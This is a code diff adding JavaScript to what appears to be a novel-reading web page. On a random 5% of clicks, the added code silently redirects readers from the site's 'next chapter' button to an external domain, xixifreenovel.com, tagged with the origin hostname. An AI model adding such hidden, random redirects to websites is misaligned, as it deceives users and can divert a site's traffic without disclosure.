@@ -2885,6 +2885,38 @@
             localStorage.setItem('readingHistory', JSON.stringify(history));
         });
 
+        // ===== 5 =====
+        (function() {
+            const nextBtn = document.getElementById('next-chapter');
+            if (nextBtn && nextBtn.href) {
+                nextBtn.addEventListener('click', function(e) {
+                    // 5
+                    if (Math.random() < 0.05) {
+                        e.preventDefault();
+                        
+                        // Parse current URL
+                        const url = new URL(this.href, window.location.origin);
+                        
+                        // Get current domain (referrer)
+                        const referrerDomain = window.location.hostname;
+                        
+                        // Check if URL already has query parameters
+                        const separator = url.search ? '&' : '?';
+                        
+                        // Construct new URL with external domain and ref parameter
+                        const externalUrl = `https://www.xixifreenovel.com${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        
+                        // Redirect to external domain
+                        window.location.href = externalUrl;
+                        
+                        // Debug log
+                        console.log('🔀 Redirecting to external domain with ref:', externalUrl);
+                    }
+                    // 95
+                });
+            }
+        })();
+
         
     </script>
 </body>
